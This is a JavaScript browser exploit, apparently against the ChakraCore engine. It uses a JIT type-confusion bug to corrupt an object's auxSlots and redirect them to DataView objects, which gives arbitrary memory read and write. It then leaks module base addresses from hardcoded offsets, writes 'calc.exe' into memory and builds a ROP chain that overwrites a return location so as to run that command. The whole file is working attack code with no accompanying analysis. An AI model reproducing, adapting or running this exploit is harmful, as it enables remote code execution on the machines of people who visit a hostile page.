function hex(x) {
    return `0x${x.toString(16)}`
}
function int64(low,high) 
{
    this.low = low;
    this.high = high;
}



var BASE = 0x100000000;
var op=[1,2,3,4];
op1={};
op1.a=op;


obj = {};
obj.a = op;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;
dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100));

BASE = 0x100000000;


function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

function main() {

    for (let i = 0; i < 20000; i++) {
        let o = {a: 1, b: 2};
        opt(o,  {}, {});
    }

    let o = {a: 1, b: 2};
  

    opt(o, o, obj); // o->auxSlots = obj (Step 1)
    
    o.c = dv1; // obj->auxSlots = dv1 (Step 2)
	
   

 let addrof=function(t){
op1.a=t;
obj.h=op1
vtable_lo = dv1.getUint32(32, true);
    vtable_hi = dv1.getUint32(36, true);
return new int64(vtable_lo,vtable_hi);
}



    let read64 = function(addr) {
	obj.h =dv2;
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr.low, true);
        dv1.setUint32(0x3C, addr.high, true);

        // read from addr (Step 5)
       return new int64(dv2.getUint32(0, true) , dv2.getUint32(4, true)) ;
    }

    let write64 = function(addr, value) {
	obj.h =dv2;
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr.low, true);
        dv1.setUint32(0x3C, addr.high, true);

        // write to addr (Step 5)
        dv2.setInt32(0, value.low, true);
        dv2.setInt32(4, value.high, true);
    }
    
    // get dv2 vtable pointer
    
  obj_addr=addrof(op);


 chakra_base=read64(obj_addr);
 chakra_base.low-=0x1803488;


let rop_addr=new int64( chakra_base.low+0x3a58e, chakra_base.high);
let rop_addr1=new int64( chakra_base.low+0x1db4a2, chakra_base.high);
let rop_addr2=new int64( chakra_base.low+0x3a584, chakra_base.high);
let tmp=new int64( chakra_base.low+0x17665c0, chakra_base.high);
kernel_base=read64(tmp);




kernel_base.low-=0x1bab0;
let exec_addr=new int64( kernel_base.low+0x5e670 ,kernel_base.high);

dv1.setUint32(0x38,obj_addr.low+0x108, true);
  dv1.setUint32(0x3C, obj_addr.high, true);
let shell=[0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65];
for (let i = 0; i < shell.length; i++) {
    dv2.setUint8(i, shell[i]);

}

   obj_addr.low+=8;
  addr=read64(obj_addr);
obj_addr.low+=0x100;

  addr.low+=8;
  addr=read64(addr);
  addr.low+=0x480;
addr=read64(addr);
 addr.low-=0xff8;
addr=read64(addr);

let dv3=new DataView(new ArrayBuffer(0x1000));
let dv_addr=addrof(dv3);

console.log(hex(dv_addr.low+dv_addr.high*BASE));
write64(addr,rop_addr2);

addr.low+=8;
write64(addr,dv_addr);
addr.low+=8;
write64(dv_addr,rop_addr);
dv_addr.low+=8;
write64(dv_addr,obj_addr);
dv_addr.low+=8;
write64(dv_addr,rop_addr1);
dv_addr.low+=8;
write64(dv_addr,new int64(1,0));
dv_addr.low+=8;
write64(dv_addr,exec_addr);


console.log(hex(addr.low+addr.high*BASE));


}



main();